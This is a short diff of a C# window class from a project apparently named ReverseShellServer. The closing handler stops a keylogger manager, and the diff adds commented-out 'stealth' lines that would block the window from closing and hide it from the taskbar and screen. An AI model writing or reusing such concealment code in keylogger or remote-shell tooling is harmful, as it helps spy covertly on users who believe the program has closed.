@@ -39,6 +39,11 @@ namespace ReverseShellServer
         void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
         {
             keyLoggerManager.Stop();
+
+            // stealth
+            /*e.Cancel = true;
+            this.ShowInTaskbar = false;
+            this.Visibility = Visibility.Hidden;*/
         }
     }
 }
